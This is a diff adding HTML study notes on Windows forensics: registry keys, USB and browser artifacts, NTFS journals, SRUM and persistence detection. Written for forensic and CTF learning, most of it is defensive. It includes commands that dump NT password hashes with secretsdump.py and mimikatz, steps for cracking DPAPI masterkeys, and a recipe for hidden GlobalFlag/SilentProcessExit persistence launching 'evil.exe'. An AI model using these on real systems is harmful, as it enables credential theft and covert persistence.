+            <h3>🛠️ 5. Software &amp; Application Artifacts</h3>
+
+            <h4>🔸 Installed Software</h4>
+            <ul>
+                <li>Location: <code>HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall</code></li>
+                <li>Lists all installed programs with install date, version, and sometimes install path.</li>
+                <li>Forensics value: Tracks suspicious or unauthorized software installations.</li>
+            </ul>
+
+            <h4>🔸 MRU Lists</h4>
+            <ul>
+                <li>Found throughout <code>NTUSER.DAT</code> (e.g., for Paint, Word, dialog boxes).</li>
+                <li>Tracks last used items like files, folders, and recent registry inputs.</li>
+                <li>Forensics value: Evidence of direct user interaction with specific files.</li>
+            </ul>
+
+            <h4>🔸 Prefetch Paths</h4>
+            <ul>
+                <li>Registry references often match with prefetch file entries.</li>
+                <li>Used together to confirm program execution.</li>
+            </ul>
+
+            <p>The Windows Registry is a <strong>critical</strong> database that stores system and user configurations.</p>
+
+            <h3>Windows Registry Structure</h3>
+            <ul>
+                <li>🗂 <strong>Hives</strong> – The top-level <strong>containers</strong> that store registry keys and values.</li>
+                <li>📂 <strong>Keys</strong> – Similar to <strong>folders</strong>, they contain subkeys and values.</li>
+                <li>📁 <strong>Subkeys</strong> – Nested inside keys, they hold further subkeys or values.</li>
+                <li>📄 <strong>Values</strong> – Store actual <strong>data</strong> (e.g., settings, configurations).</li>
+            </ul>
+
+            <h3>Registry Artifacts</h3>
+
+            <h4>1. NTUSER.DAT</h4>
+            <p>A registry hive located in each user's profile directory:</p>
+
+            <h4>Command Execution</h4>
+            <p>Start with NTUSER.DAT, SYSTEM, and SOFTWARE for payload execution tracing.</p>
+            <pre><code>NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Run
+SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code></pre>
+
+            <p>Shows evidence of interactive use of powershell.exe or powershell_ise.exe:</p>
+            <pre><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\</code></pre>
+
+            <p>Tracks commands run via the Run dialog (Win + R):</p>
+            <pre><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU</code></pre>
+
+            <p>Lists programs executed:</p>
+            <pre><code>SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache</code></pre>
+
+            <hr>
+
+            <h4>1. Windows Product Information</h4>
+            <pre><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion</code></pre>
+            <p>🔹 Stores Windows <strong>version, build number, installation date, product ID, and registered owner</strong>.</p>
+            <p>🔹 Forensic use: Identifies the OS version for compatibility and investigation.</p>
+
+            <h4>2. Windows Computer Name</h4>
+            <pre><code>HKLM\SYSTEM\ControlSet00#\Control\ComputerName\ComputerName</code></pre>
+            <p>🔹 Stores the <strong>current name</strong> of the computer.</p>
+            <p>🔹 Forensic use: Identifies <strong>system ownership</strong> and <strong>network identification</strong>.</p>
+
+            <h4>3. Windows Services &amp; Startup Type</h4>
+            <pre><code>HKLM\SYSTEM\ControlSet00#\Services\&lt;ServiceName&gt;\Start</code></pre>
+            <p>🔹 The <strong>Start</strong> value determines how a service behaves:</p>
+            <ul>
+                <li><strong>0</strong> = Boot</li>
+                <li><strong>1</strong> = System</li>
+                <li><strong>2</strong> = Automatic</li>
+                <li><strong>3</strong> = Manual</li>
+                <li><strong>4</strong> = Disabled</li>
+            </ul>
+            <p>🔹 Forensic use: Helps detect <strong>malicious services</strong> or <strong>persistence mechanisms</strong> used by attackers.</p>
+
+            <h4>4. Windows DHCP Configuration</h4>
+            <pre><code>HKLM\SYSTEM\ControlSet00#\Services\Tcpip\Parameters\Interfaces\{GUID}\DhcpIPAddress</code></pre>
+            <p>🔹 Stores the <strong>current IP address assigned via DHCP</strong>.</p>
+            <p>🔹 Forensic use: Tracks <strong>network activity</strong> and <strong>connected networks</strong>.</p>
+
+            <h4>5. Legal Notice (Login Message)</h4>
+            <pre><code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\</code></pre>
+            <p>🔹 Stores the <strong>logon banner message</strong> shown to users before signing in.</p>
+            <p>🔹 Forensic use: Used by organizations for <strong>security warnings</strong>.</p>
+
+            <h4>6. NTFS Last Accessed Time</h4>
+            <pre><code>HKLM\SYSTEM\ControlSet###\Control\FileSystem</code></pre>
+            <p>🔹 Controls whether Windows records the <strong>last access time</strong> for files.</p>
+            <p>🔹 Forensic use: If enabled, it can help track <strong>file access history</strong>.</p>
+
+            <h4>7. Autorun Programs (Persistence)</h4>
+            <pre><code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</code></pre>
+            <p>🔹 Stores <strong>programs that run automatically at startup</strong>.</p>
+            <p>🔹 Forensic use: Detects <strong>malware persistence</strong> and <strong>unauthorized software</strong>.</p>
+
+            <h4>8. Installed Applications</h4>
+            <pre><code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
+HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall</code></pre>
+            <p>🔹 Stores <strong>installed applications</strong> and <strong>uninstallation details</strong>.</p>
+            <p>🔹 Forensic use: Tracks <strong>software installations and suspicious programs</strong>.</p>
+
+            <h4>9. Firewall Status (0 = Off, 1 = On)</h4>
+            <pre><code>HKLM\SYSTEM\ControlSet###\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\EnableFirewall
+HKLM\SYSTEM\ControlSet###\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile\EnableFirewall
+HKLM\SYSTEM\ControlSet###\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile\EnableFirewall</code></pre>
+            <p>🔹 Stores the <strong>firewall status</strong> for different network profiles (Private, Public, Domain).</p>
+            <p>🔹 Forensic use: Detects <strong>firewall tampering</strong> or <strong>disabled security settings</strong>.</p>
+
+            <h4>10. Remote Desktop (RDP) Status (1 = Off, 0 = On)</h4>
+            <pre><code>HKLM\SYSTEM\ControlSet###\Control\TerminalServer\fDenyTSConnections</code></pre>
+            <p>🔹 Determines whether <strong>Remote Desktop</strong> is enabled or disabled.</p>
+            <p>🔹 Forensic use: Checks for <strong>remote access activity</strong>.</p>
+
+            <h4>11. Network History</h4>
+            <pre><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Nla\Cache
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Unmanaged
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Managed</code></pre>
+            <p>🔹 Stores information about <strong>past network connections</strong>.</p>
+            <p>🔹 Forensic use: Tracks <strong>previously connected networks and their details</strong>.</p>
+
+            <h4>12. Shutdown Time</h4>
+            <pre><code>HKLM\SYSTEM\ControlSet001\Control\Windows\ShutdownTime</code></pre>
+            <p>🔹 Records the <strong>last shutdown time</strong> (in <strong>little endian format</strong>).</p>
+            <p>🔹 Forensic use: Helps <strong>reconstruct event timelines</strong>.</p>
+
+            <h4>13. DLL Injection (Malware Persistence)</h4>
+            <pre><code>HKLM\Software\Microsoft\WindowsNT\CurrentVersion\Windows\Applnit_DLLs</code></pre>
+            <p>🔹 Stores <strong>DLLs</strong> that are automatically loaded into every process.</p>
+            <p>🔹 Forensic use: <strong>Attackers use this for code injection</strong> and persistence.</p>
+
+            <h4>14. Recycle Bin Settings</h4>
+            <pre><code>NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\BitBucket\Volume\{GUID}\NukeOnDelete</code></pre>
+            <p>🔹 Determines whether the <strong>Recycle Bin is bypassed</strong> (1 = Yes, 0 = No).</p>
+            <p>🔹 Forensic use: Detects <strong>potential data deletion attempts</strong>.</p>
+
+            <h4>15. Last Logged-in User</h4>
+            <pre><code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\LastLoggedOnUser</code></pre>
+            <p>🔹 Stores the <strong>username of the last logged-in user</strong>.</p>
+            <p>🔹 Forensic use: Identifies <strong>who accessed the system last</strong>.</p>
+
+            <h4>16. User Sessions (Live System Analysis)</h4>
+            <pre><code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\SessionData\</code></pre>
+            <p>🔹 Stores <strong>active user session data</strong>.</p>
+            <p>🔹 Forensic use: Tracks <strong>currently logged-in users</strong>.</p>
+
+            <h4>17. Local User Accounts</h4>
+            <pre><code>HKLM\SAM\Domains\Users
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList</code></pre>
+            <p>🔹 Stores <strong>usernames, passwords (hashed), and profile details</strong>.</p>
+            <p>🔹 Forensic use: Tracks <strong>local user accounts and their settings</strong>.</p>
+
+            <h4>18. User Account Control (UAC) Status</h4>
+            <pre><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Policies\System\EnableLUA</code></pre>
+            <p>🔹 <strong>1 = UAC Enabled, 0 = UAC Disabled</strong>.</p>
+            <p>🔹 Forensic use: Detects <strong>potential security risks</strong>.</p>
+
+            <h4>19. User Activity Tracking</h4>
+            <pre><code>NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist
+NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit\LastKey</code></pre>
+            <p>🔹 Tracks <strong>opened files, registry edits, and explorer activity</strong>.</p>
+            <p>🔹 Forensic use: Tracks <strong>user behavior on the system</strong>.</p>
+
+            <h4>20. Internet Explorer Typed URLs</h4>
+            <pre><code>NTUSER.DAT\Software\Microsoft\Internet Explorer\TypedURLs</code></pre>
+            <p>🔹 Stores <strong>URLs manually typed by the user</strong>.</p>
+            <p>🔹 Forensic use: Tracks <strong>browsing history</strong>.</p>
+
+            <h4>21. Time Zone Information</h4>
+            <pre><code>HKLM\SYSTEM\ControlSet###\Control\TimeZoneInformation</code></pre>
+            <p>🔹 <code>ControlSet###</code> refers to <strong>ControlSet001</strong>, <strong>ControlSet002</strong>, or <strong>CurrentControlSet</strong> (depending on the active control set).</p>
+            <p>🔹 Forensic use: Determines the <strong>system's time zone</strong> at the time of investigation</p>
+
+            <hr>
+
+            <h2>USB Device</h2>
+            <pre><code>HKLM\SYSTEM\ControlSet00?\Enum\USBSTOR</code></pre>
+            <ul>
+                <li>Stores details about the USB device, including vendor, product name, and revision number.</li>
+            </ul>
+
+            <ul>
+                <li><strong>Mounted Devices:</strong> <code>HKLM\SYSTEM\MountedDevices</code>
+                    <ul>
+                        <li>Lists all storage devices that have been connected.</li>
+                        <li>Shows drive letters assigned to each device, which can help determine if a USB was used for data transfer.</li>
+                    </ul>
+                </li>
+            </ul>
+
+            <ol>
+                <li><strong>System Log Files (Device Installation and Connection Details)</strong>
+                    <ul>
+                        <li><strong>Windows INF Folder:</strong> <code>C:\Windows\INF\</code>
+                            <ul><li>Contains logs related to device installations.</li></ul>
+                        </li>
+                        <li><strong>Connection and Removal Timestamps:</strong>
+                            <ul>
+                                <li><strong>Device Installation Time:</strong> <code>HKLM\SYSTEM\ControlSet001\Enum\USBSTOR\...\0064</code></li>
+                                <li><strong>Last Connection Time:</strong> <code>HKLM\SYSTEM\ControlSet001\Enum\USBSTOR\...\0066</code></li>
+                                <li><strong>Last Removal Time:</strong> <code>HKLM\SYSTEM\ControlSet001\Enum\USBSTOR\...\0067</code></li>
+                                <li>These timestamps are crucial for tracking USB usage and identifying unauthorized access or data transfers.</li>
+                            </ul>
+                        </li>
+                    </ul>
+                </li>
+            </ol>
+
+            <h3>Tools for USB Forensics</h3>
+            <ul>
+                <li><strong>Registry Explorer</strong> – Extracts and analyzes registry keys related to USB devices.</li>
+                <li><strong>USBDeviceForensics</strong> – Automates the process of extracting USB-related artifacts.</li>
+                <li><strong>RegRipper</strong> – Parses registry hives and generates reports on USB activity.</li>
+            </ul>
+
+            <hr>
+
+            <h2>Browser Forensics</h2>
+            <p>Browser forensics involves analyzing web browsing history, cached data, cookies, and other artifacts stored by web browsers.</p>
+
+            <h3>Browser Artifact</h3>
+            <ol>
+                <li><strong>Browsing History</strong>
+                    <ul>
+                        <li>Stores visited websites, including timestamps and URLs.</li>
+                        <li>Can help reconstruct a user's online activity.</li>
+                        <li>Useful for tracking suspicious or unauthorized browsing behavior.</li>
+                    </ul>
+                </li>
+                <li><strong>Cache</strong>
+                    <ul>
+                        <li>Stores locally downloaded copies of web content such as images, scripts, and pages.</li>
+                        <li>Helps speed up page loading by avoiding repeated downloads.</li>
+                        <li>Can contain remnants of deleted web pages, which is useful in forensic investigations.</li>
+                    </ul>
+                </li>
+                <li><strong>Cookies</strong>
+                    <ul>
+                        <li>Small text files stored by websites to maintain user sessions and preferences.</li>
+                        <li>Can contain login details, authentication tokens, and tracking data.</li>
+                        <li>Helps in identifying user interactions with websites.</li>
+                    </ul>
+                </li>
+            </ol>
+
+            <hr>
+
+            <h3>Internet Explorer - Registry and File Locations</h3>
+            <ol>
+                <li><strong>Autocomplete Data (Saved Forms &amp; Typed URLs)</strong>
+                    <ul>
+                        <li><code>HKCU\Software\Microsoft\Internet Explorer\Intelliforms\Storage1</code> — Autocomplete</li>
+                        <li><code>HKCU\Software\Microsoft\Internet Explorer\Intelliforms\Storage2</code> — Typed URLs</li>
+                        <li>Stores user-inputted data in forms and previously typed URLs.</li>
+                        <li>Useful for retrieving login credentials and frequently visited sites.</li>
+                    </ul>
+                </li>
+                <li><strong>Cache Files</strong>
+                    <ul>
+                        <li><code>%USERPROFILE%\AppData\Local\Microsoft\Windows\Temporary Internet Files\</code></li>
+                        <li>Contains cached web pages, images, and scripts.</li>
+                        <li>Can reveal details of visited websites even after the browsing history is cleared.</li>
+                    </ul>
+                </li>
+                <li><strong>Bookmarks (Favorites)</strong>
+                    <ul>
+                        <li><code>%USERPROFILE%\Favorites</code></li>
+                        <li>Stores saved websites, allowing investigators to see sites of interest to the user.</li>
+                    </ul>
+                </li>
+                <li><strong>Cookies</strong>
+                    <ul>
+                        <li><code>%USERPROFILE%\AppData\Local\Microsoft\Windows\Cookies\Low</code></li>
+                        <li>Stores website cookies, which can help track user behavior, logins, and online services accessed.</li>
+                    </ul>
+                </li>
+            </ol>
+
+            <hr>
+
+            <div class="note-box">
+                <strong>note — إزاي بيشتغل الدخول بالكوكيز</strong>
+                <ol>
+                    <li>لما المستخدم يسجّل دخول → السيرفر (زي MEGA) بيولّد <strong>Session ID</strong>.
+                        <ul>
+                            <li>بيتخزن عنده في الـ <strong>database</strong> (عشان يربطه بالمستخدم).</li>
+                            <li>وبعدين بيبعت نسخة للمتصفح كـ <strong>Cookie</strong>.</li>
+                        </ul>
+                    </li>
+                    <li>كل مرة تفتح صفحة جديدة على نفس الدومين → المتصفح يضيف الكوكيز أوتوماتيك مع الـ Request.
+                        <ul>
+                            <li>السيرفر يلاقي Session ID صح → يعتبرك "مُسجّل دخول"</li>
+                        </ul>
+                    </li>
+                </ol>
+            </div>
+
+            <h3>Firefox Cache (Morgue Files)</h3>
+            <ul>
+                <li>Firefox stores cached web content in a compressed format inside its profile directory.</li>
+                <li>"Morgue" files are <strong>compressed cache entries</strong> that may contain:
+                    <ul>
+                        <li>Images</li>
+                        <li>JavaScript files</li>
+                        <li>Media content</li>
+                    </ul>
+                </li>
+            </ul>
+
+            <h3>Telegram Web Cached Content</h3>
+            <ul>
+                <li>Telegram Web does not always save files directly to disk.</li>
+                <li>Images viewed in chats or channels are often:
+                    <ul>
+                        <li>Cached by the browser</li>
+                        <li>Stored without meaningful filenames</li>
+                    </ul>
+                </li>
+                <li>The cached concert image was evidence of:
+                    <ul>
+                        <li>User interaction with specific content</li>
+                    </ul>
+                </li>
+            </ul>
+
+            <h3>Autopsy</h3>
+            <ul>
+                <li>Identify Firefox cache entries</li>
+                <li>Locate relevant cache directories</li>
+                <li>Limitation:
+                    <ul>
+                        <li>Can display cache <strong>metadata</strong></li>
+                        <li>Cannot extract the <strong>actual decompressed cache content</strong></li>
+                    </ul>
+                </li>
+            </ul>
+
+            <h3>snappy-fox</h3>
+            <p><strong>Purpose: Firefox cache decompression</strong></p>
+            <ul>
+                <li>A specialized tool designed to:
+                    <ul>
+                        <li>Decompress Firefox <em>morgue</em> cache files</li>
+                        <li>Recover actual file contents (images, scripts, etc.)</li>
+                    </ul>
+                </li>
+                <li>Essential because Firefox cache files are:
+                    <ul>
+                        <li>Compressed</li>
+                        <li>Not directly viewable or extractable by standard tools</li>
+                    </ul>
+                </li>
+            </ul>
+
+            <h3>PowerRename (Microsoft PowerToys)</h3>
+            <p><strong>Artifact triage and identification</strong></p>
+            <ul>
+                <li>Used to:
+                    <ul>
+                        <li>Bulk-add <code>.png</code> extensions to decompressed files</li>
+                    </ul>
+                </li>
+                <li>This allowed:
+                    <ul>
+                        <li>Windows Explorer image previews</li>
+                        <li>Rapid visual identification of relevant images</li>
+                    </ul>
+                </li>
+            </ul>
+
+            <hr>
+
+            <h2>Master File Table (MFT)</h2>
+            <p>MFT / J / logfile</p>
+
+            <hr>
+
+            <h2>File System Journaling</h2>
+            <p>A transactional record of all changes made to a volume.</p>
+            <ul>
+                <li>In the event of a crash or power failure, the system uses this information to roll back the changes.</li>
+            </ul>
+
+            <h3>$UsnJrnl</h3>
+            <p>It keeps a <strong>log of changes</strong> like file creations, deletions, renaming happening on the disk.</p>
+            <p>Whenever a file is <strong>created, deleted, renamed, or modified</strong>, the system records it in <strong>$UsnJrnl</strong>.</p>
+            <p>It is stored in <strong>$Extend$UsnJrnl</strong> on an NTFS drive.</p>
+            <p>Inside it, there are two important streams:</p>
+            <ul>
+                <li><strong>$J</strong> → The main journal that records file changes.</li>
+                <li><strong>$Max</strong> → Controls the maximum size of the journal.</li>
+            </ul>
+            <p>Used by backup/anti-virus software to monitor changes to files</p>
+
+            <h3>$LogFile</h3>
+            <ul>
+                <li>Special file in NTFS that keeps a <strong>record of low-level file system changes</strong>.</li>
+                <li>It <strong>tracks detailed operations</strong> that happen to the file system.</li>
+                <li>It is stored <strong>at the root</strong> of an NTFS volume (partition).</li>
+                <li>It ensures <strong>file system integrity</strong>, meaning it helps <strong>recover lost data</strong> if something goes wrong (like a system crash).</li>
+            </ul>
+            <p>Unlike <strong>$UsnJrnl</strong>, which tracks high-level changes (like file creations and deletions), <strong>$LogFile tracks deeper system-level changes</strong>.</p>
+
+            <h4>Some examples of operations recorded:</h4>
+            <ul>
+                <li><strong>AddIndexEntryAllocation</strong> → When a new file entry is added to the index.</li>
+                <li><strong>InitializeFileRecordSegment</strong> → When a new file record is created.</li>
+                <li><strong>DeleteIndexEntryAllocation</strong> → When a file entry is removed from the index.</li>
+            </ul>
+
+            <p><strong>Example:</strong></p>
+            <ul>
+                <li><code>$UsnJrnl</code> → It records <strong>what happened</strong>:
+                    <ul>
+                        <li>"File X was created"</li>
+                        <li>"File Y was renamed"</li>
+                        <li>"File Z was deleted"</li>
+                    </ul>
+                </li>
+                <li><code>$LogFile</code> (machine's internal memory) → It tracks <strong>how</strong> the factory changed things:
+                    <ul>
+                        <li>"Allocated space here"</li>
+                        <li>"Changed this file record here"</li>
+                        <li>"Moved internal structure from A to B"</li>
+                    </ul>
+                </li>
+            </ul>
+
+            <p><strong>Example:</strong></p>
+            <ul>
+                <li><code>$UsnJrnl</code>: Logs → "User created hello.txt"</li>
+                <li><code>$LogFile</code>: Logs → "NTFS added a new entry to the MFT" → "Allocated cluster space for data" → "Updated directory structure"</li>
+            </ul>
+
+            <hr>
+
+            <h2>Alternate Data Streams</h2>
+            <ul>
+                <li>You can check the source of the URL Download the malicious file from mft.csv with filter zone identifier</li>
+            </ul>
+
+            <hr>
+
+            <h2>SRUM (System Resource Usage Monitor)</h2>
+            <p>The SRUM is a Windows component that logs system activity related to resource usage, primarily for diagnostics and performance tracking. It can be useful in digital forensics because it tracks application usage over time</p>
+            <pre><code>C:\Windows\System32\sru\SRUDB.dat</code></pre>
+            <ul>
+                <li>Tracks executed processes — even if logs or prefetch are cleared.</li>
+                <li>Correlates user activity (through SIDs).</li>
+                <li>Timeline reconstruction of app usage.</li>
+                <li>May show malware persistence or stealthy execution patterns.</li>
+            </ul>
+            <p>SRUDB is a <strong>JET Blue (ESENT)</strong> database, and it stores data across <strong>multiple tables</strong>, each recording a different aspect of system activity.</p>
+
+            <hr>
+
+            <h2>File Carving</h2>
+            <p>Tools for file carving on the disk:</p>
+            <ol>
+                <li>Photorec</li>
+                <li>Scalpel</li>
+                <li>WinFR (Windows File Recovery)</li>
+                <li>MyRecover</li>
+                <li>Recuva</li>
+                <li>Disk Drill (preferred)</li>
+            </ol>
+            <ul>
+                <li><strong>Search for lost data</strong> → Universal Scan, "after scan finished" → <strong>review found items</strong></li>
+            </ul>
+            <div class="note-box">
+                <strong>NOTE:</strong> most tools need the disk image to be mounted to do file carving correctly, so we'll use Arsenal Image Mounter to mount that image — just a few easy clicks to mount the image file. You can follow the clusters and find the file.
+            </div>
+
+            <hr>
+
+            <h2>Windows Mail</h2>
+            <p><a href="https://forums.passmark.com/osforensics-osfmount-osfclone/51182-how-to-extract-the-emails-from-the-windows-10-mail-app" target="_blank">Reference: How to extract the emails from the Windows 10 Mail app</a></p>
+            <p>The Outlook data folder has a PST file, so use an OST-Viewer to read it.</p>
+
+            <hr>
+
+            <h2>RDP Artifacts</h2>
+            <p><a href="https://www.magnetforensics.com/blog/rdp-artifacts-in-incident-response/" target="_blank">Reference: RDP Artifacts in Incident Response — Magnet Forensics</a></p>
+            <p><a href="https://cdn.13cubed.com/downloads/rdp_flowchart.pdf" target="_blank">RDP Flowchart (13Cubed)</a></p>
+
+            <p>RDP artifacts can provide a wealth of information, including session details such as:</p>
+            <ul>
+                <li>Usernames</li>
+                <li>Machine names</li>
+                <li>IP addresses</li>
+                <li>Timestamps of RDP logins</li>
+            </ul>
+
+            <hr>
+
+            <h2>Clipboard</h2>
+
+            <hr>
+
+            <h2>PsExec</h2>
+            <p><a href="https://dfirdominican.com/the-key-to-identify-psexec/" target="_blank">Reference: The Key to Identify PsExec</a></p>
+
+            <hr>
+
+            <h2>Credentials of the User</h2>
+            <p>There are many methods to find it:</p>
+
+            <h3>secretsdump.py</h3>
+            <p>Found the <code>SAM</code> and <code>SYSTEM</code> registry hives, used <code>secretsdump.py</code> (Impacket) to extract the local account NT hashes, and cracked the Administrator NT hash:</p>
+            <ul>
+                <li><code>SAM</code> (contains user account database, encrypted)</li>
+                <li><code>SYSTEM</code> (contains the keys to decrypt SAM)</li>
+                <li>Use <code>secretsdump.py</code> to dump local account hashes from the offline hive pair.</li>
+            </ul>
+            <pre><code>python3 secretsdump.py -sam SAM -system SYSTEM LOCAL</code></pre>
+
+            <h3>mimikatz.exe</h3>
+            <ul>
+                <li>Open mimikatz in Windows PowerShell, navigate to win32</li>
+            </ul>
+            <pre><code>mimikatz # lsadump::sam /system:C:\test\SYSTEM /sam:C:\test\SAM</code></pre>
+            <ul>
+                <li><a href="https://crackstation.net/" target="_blank">CrackStation</a> — for cracking hashes</li>
+                <li><a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank">Hashcat Example Hashes</a></li>
+                <li><a href="https://medium.com/@LoaySalah/ieee-mansb-ctf-2025-dfir-writeup-3b49a1afe7f6" target="_blank">IEEE MANSB CTF 2025 — DFIR Writeup</a></li>
+            </ul>
+
+            <h3>DPAPI</h3>
+            <p>If you don't have the SAM hive:</p>
+            <ul>
+                <li>DPAPI masterkey file: <code>AppData\Roaming\Microsoft\Protect\S-1-5-21-2430665207-3300790704-3908932582-1001\a3ef4996-d3ea-422c-9de1-62931c21fb47</code></li>
+                <li>And the user SID: <code>S-1-5-21-2430665207-3300790704-3908932582-1001</code></li>
+                <li>To extract a hash for password cracking:</li>
+            </ul>
+            <p><a href="https://www.kali.org/tools/john/#dpapimk2john" target="_blank">dpapimk2john (Kali Tools)</a> — then get the hash and crack it.</p>
+
+            <hr>
+
+            <h2>Mimikatz</h2>
+            <ul>
+                <li><a href="https://www.coresecurity.com/core-labs/articles/reading-dpapi-encrypted-keys-mimikatz" target="_blank">Reading DPAPI Encrypted Keys with Mimikatz</a></li>
+                <li><a href="https://otterhacker.github.io/Pentest/Techniques/DPAPI.html" target="_blank">DPAPI Techniques — OtterHacker</a></li>
+                <li><a href="https://www.varonis.com/blog/what-is-mimikatz" target="_blank">What is Mimikatz — Varonis</a></li>
+            </ul>
+
+            <hr>
+
+            <h2>Logs</h2>
+
+            <hr>
+
+            <h2>TeamViewer</h2>
+
+            <hr>
+
+            <h2>Command Execution</h2>
+
+            <h3>Event Logs (search for cmd or powershell)</h3>
+            <ul>
+                <li><strong>Security 4688 (Process Creation)</strong> — contains <em>process name</em> and, <strong>if "Include command line in process creation events" is enabled</strong>, the full command-line.</li>
+                <li><strong>Sysmon Event ID 1 (ProcessCreate)</strong></li>
+                <li><strong>PowerShell logs</strong></li>
+                <li><strong>WMI Event Logs</strong> and <strong>Task Scheduler</strong> Operational logs (if attacker used WMI or scheduled tasks).</li>
+            </ul>
+
+            <h3>Registry</h3>
+            <ul>
+                <li><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU</code> — run dialog MRU (commands/user-typed runs).</li>
+                <li><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist</code> — executed programs count/timestamps (encoded).</li>
+                <li><strong>Run / RunOnce keys</strong> — persistence entries that store command paths/args.</li>
+            </ul>
+
+            <hr>
+
+            <h2>desktop.ini</h2>
+            <p><code>desktop.ini</code> is a <strong>Windows system file</strong> used to <strong>store folder display and customization settings</strong>.</p>
+            <p>On NTFS filesystems (Windows), a file can have <strong>hidden streams</strong> attached to it.</p>
+
+            <hr>
+
+            <h2>Persistence Mechanisms</h2>
+
+            <h3>Run and RunOnce Registry Keys</h3>
+            <p>Use <code>Run</code> or <code>RunOnce</code> registry keys to make a program run when a user logs on. The <code>Run</code> key makes the program run every time the user logs on, while the <code>RunOnce</code> key makes the program run one time, and then the key is deleted. These keys can be set for the user or the machine.</p>
+            <pre><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code></pre>
+
+            <h3>Persistence using GlobalFlags in Image File Execution Options – Hidden from Autoruns.exe</h3>
+            <p><a href="https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/" target="_blank">Reference: oddvar.moe — GlobalFlags persistence technique</a></p>
+
+            <p>This technique creates <strong>persistence in Windows</strong> by abusing two registry features:</p>
+            <ul>
+                <li>Image File Execution Options</li>
+                <li>Silent Process Exit</li>
+            </ul>
+
+            <div class="note-box">
+                When a specific program <strong>exits</strong>, Windows automatically <strong>launches another program</strong>.
+            </div>
+
+            <p>The attacker adds <strong>three registry values</strong>. It can evade startup detection tools.</p>
+            <p>The persistence may not appear in common startup tools.</p>
+
+            <ol>
+                <li>Enable monitoring with GlobalFlag in
+                    <pre><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe</code></pre>
+                    Change value GlobalFlag to <code>GlobalFlag = 512</code> — that means <code>FLG_MONITOR_SILENT_PROCESS_EXIT</code>, telling Windows to monitor when this process exits.
+                </li>
+                <li><strong>Configure Silent Process Exit</strong>
+                    <pre><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe</code></pre>
+                    Change to <code>ReportingMode = 1</code> — this enables an <strong>action when the monitored process exits</strong>.
+                </li>
+                <li><strong>Define the payload</strong> — Same registry key, set to:
+                    <pre><code>MonitorProcess = C:\temp\evil.exe</code></pre>
+                    Now Windows knows what program to launch.
+                </li>
+            </ol>
+
+            <hr>
+
+            <h2>Volume Shadow Copies</h2>
+            <p><a href="https://medium.com/@ahmedmoaz2003/full-forensic-volume-shadow-copies-b3585bf84d8f" target="_blank">Reference: Full Forensic — Volume Shadow Copies</a></p>
+            <p><strong>Shadow Copy</strong> (also known as <strong>Volume Snapshot Service</strong>, <strong>Volume Shadow Copy Service</strong> or <strong>VSS</strong>) is a technology included in Microsoft Windows that allows taking manual or automatic backup copies or snapshots of computer files or volumes, even when they are in use.</p>
 
             <!-- Back Button -->
             <div style="margin-top: 40px;">
@@ -187,7 +1309,6 @@ htop
         </div>
     </div>
 </div>
-
 <script src="https://unpkg.com/ionicons@5.5.2/dist/ionicons.js"></script>
 </body>
 </html>
